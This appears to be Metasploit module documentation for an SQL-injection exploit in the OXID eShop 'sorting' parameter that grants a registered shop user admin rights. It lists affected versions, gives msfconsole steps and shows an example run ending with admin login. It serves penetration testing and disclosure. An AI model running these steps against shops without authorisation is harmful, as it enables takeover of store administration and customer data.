## Description

This module takes advantage of missing input validation within the "sorting" parameter in the OXID web shop.
A part of the sorting parameter is used within an ORDER BY clause with no input validation (except single and double quotes).

In order to exploit this vulnerability a detailed product description has to be called with the maliciously crafted sorting URL parameter.

More info about the vulnerability can be found within the module source code and the [vulnerability writeup](https://blog.ripstech.com/2019/oxid-esales-shop-software/)

## Vulnerable Application

* Affected products

  * OXID eShop Enterprise Edition (“EE”)
  * OXID eShop Professional Edition (“PE”)
  * OXID eShop Community Edition (“CE”)

* Affected Versions
  * OXID eShop EE, PE and CE v6.0.0 – v6.0.4
  * OXID eShop EE, PE and CE v6.1.0 – v6.1.3

## Verification Steps

  1. Start msfconsole
  2. Do: ```use exploit/multi/http/oxid_web_shop_admin```
  3. Do: ``set rhosts <address/IP>``
  3. Do: ``set email <email>``
  5. Do: ``set targeturi <Path_to_detailed_item_view>``
  5. Do: ``run``

## Scenarios

  Example run against OXID eShop CE 6.0.2 with user account evil@gmail.com:

```
Create user account on the OXID shop with the email evil@gmail.com
Browse to the detailed view of an item and copy the URL path for the "targeturi"

msf5 > use exploit/multi/http/oxid_web_shop_admin 
msf5 auxiliary(multi/http/oxid_web_shop_admin) > set rhosts 10.97.98.211
rhosts => 10.97.98.211
msf5 auxiliary(multi/http/oxid_web_shop_admin) > set targeturi /en/Gear/Sportswear/Neoprene/Suits/Wetsuit-NPX-ASSASSIN.html
targeturi => /en/Gear/Sportswear/Neoprene/Suits/Wetsuit-NPX-ASSASSIN.html
msf5 auxiliary(multi/http/oxid_web_shop_admin) > set email evil@gmail.com
msf5 auxiliary(multi/http/oxid_web_shop_admin) > run
[*] Running for 10.97.98.211...
[+] Exploit HTTP response code: 200
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

Go to http://10.97.98.211/admin/
Log in with your created user account
```
